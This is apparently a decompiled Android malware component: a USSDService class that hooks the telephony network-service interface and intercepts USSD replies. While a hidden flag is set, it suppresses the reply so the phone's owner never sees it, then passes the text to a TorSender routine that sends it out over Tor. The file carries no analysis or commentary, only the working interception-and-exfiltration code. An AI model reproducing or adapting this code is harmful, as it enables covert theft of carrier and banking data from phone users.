package com.baseapp;

import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.os.IBinder;
import android.os.RemoteException;
import com.android.internal.telephony.IExtendedNetworkService;

/* loaded from: classes.dex */
public class USSDService extends Service {
    public static boolean isRunning = false;
    private final IExtendedNetworkService.Stub mBinder = new IExtendedNetworkService.Stub() { // from class: com.baseapp.USSDService.1
        @Override // com.android.internal.telephony.IExtendedNetworkService
        public void clearMmiString() throws RemoteException {
        }

        @Override // com.android.internal.telephony.IExtendedNetworkService
        public void setMmiString(String number) throws RemoteException {
        }

        @Override // com.android.internal.telephony.IExtendedNetworkService
        public CharSequence getMmiRunningText() throws RemoteException {
            if (USSDService.this.isActive()) {
                return null;
            }
            return "USSD Running";
        }

        @Override // com.android.internal.telephony.IExtendedNetworkService
        public CharSequence getUserMessage(CharSequence text) throws RemoteException {
            if (USSDService.this.isActive()) {
                Utils.putBooleanValue(USSDService.this.settings, Constants.MAKING_USSD, false);
                TorSender.sendUSSDData(USSDService.this, text.toString());
                return null;
            }
            return text;
        }
    };
    private SharedPreferences settings;

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        IntentFilter filter = new IntentFilter();
        filter.addDataScheme(getBaseContext().getString(R.string.uri_scheme));
        filter.addDataAuthority(getBaseContext().getString(R.string.uri_authority), null);
        filter.addDataPath(getBaseContext().getString(R.string.uri_path), 0);
        return this.mBinder;
    }

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
        isRunning = true;
        this.settings = getSharedPreferences(Constants.PREFS_NAME, 0);
    }

    @Override // android.app.Service
    public void onDestroy() {
        super.onDestroy();
        isRunning = false;
    }

    /* JADX INFO: Access modifiers changed from: private */
    public boolean isActive() {
        return this.settings.getBoolean(Constants.MAKING_USSD, false);
    }
}